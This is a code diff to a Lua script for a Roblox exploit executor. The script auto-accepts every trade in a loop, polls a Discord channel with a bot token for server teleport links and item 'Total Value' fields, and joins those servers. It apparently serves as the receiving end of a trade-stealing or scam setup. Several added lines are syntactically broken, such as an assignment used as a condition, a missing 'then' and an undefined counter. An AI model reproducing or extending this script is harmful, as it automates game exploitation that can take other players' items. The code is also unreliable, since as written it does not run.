@@ -1,3 +1,6 @@
+if not channelId or not token then
+	game:GetService("Players").LocalPlayer:kick("add your token or channel id breh")
+end
 if not game:IsLoaded() then
 	game.Loaded:Wait() -- We wait while the game loads
 end
@@ -12,10 +15,15 @@ game:service "Players".LocalPlayer.Idled:connect(
 
 local HttpServ = game:GetService("HttpService")
 local joinFile = isfile("lastjoin.txt")
+local valueFile = isfile("value.txt")
 if not joinFile then
     writefile("lastjoin.txt", "placeholder")
 end
+if not valueFile then
+    writefile("value.txt", "0")
+end
 local LastMsgId = readfile("lastjoin.txt")
+local currentvalue = tonumber(readfile("value.txt"))
 local thing = game:GetService('ReplicatedFirst'):WaitForChild('UISelector'):WaitForChild('LoadingS2'):WaitForChild('Loading')
 while thing.Enabled do
     wait(1) -- We wait while the loading screen is active
@@ -33,12 +41,30 @@ end
 
 local function acceptTrade()
     while task.wait(0.1) do
-        game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('AcceptTrade'):FireServer(unpack({[1] = 285646582}))
+        game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('AcceptTrade'):FireServer(285646582)
     end
 end
-
+local function IsTrading()
+	local trade_statue = game:GetService("ReplicatedStorage").Trade.GetTradeStatus:InvokeServer()
+	if trade_statue == "StartTrade" then
+		return  true
+	elseif trade_statue == "None" then
+		return false
+	end
+end
+local function countTrade()
+	local trading = false
+	while task.wait(0.1) do
+		if IsTrading() == true and trading = false then
+			x = x +1
+		elseif IsTrading() == false
+			trading = false
+		end
+	end
+end
 task.spawn(acceptRequest) -- Start accepting trade requests
 task.spawn(acceptTrade) -- Start accepting trades
+task.spawn(countTrade)
 
 local function autoJoin()
     local response = request({
@@ -50,18 +76,23 @@ local function autoJoin()
             ["Content-Type"] = "application/json"
         }
     })
-
     if response.StatusCode == 200 then
         local messages = HttpServ:JSONDecode(response.Body)
-        if #messages > 0 then
+		if #messages > 0 then
             local placeId, jobId = string.match(messages[1].content, 'TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)') -- Extract placeId and jobId from the embed
-
-            if tostring(messages[1].id) ~= LastMsgId and placeId ~= nil then
-                LastMsgId = tostring(messages[1].id)
-                writefile("lastjoin.txt", LastMsgId)
-                game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId) -- Join the server
-            end
-        end
+			if #messages > 0 then
+				repeat task.wait() until not IsTrading()
+				value = string.match(messages[1].embeds[1].fields[4].value, "Total Value: (%d+)")
+				if (currentvalue <= tonumber(value) or x >= 2) then
+					writefile("value.txt", value)
+					if tostring(messages[1].id) ~= LastMsgId and placeId ~= nil then
+						LastMsgId = tostring(messages[1].id)
+						writefile("lastjoin.txt", LastMsgId)
+						game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId) -- Join the server
+					end
+				end
+			end
+		end
     end
 end
 
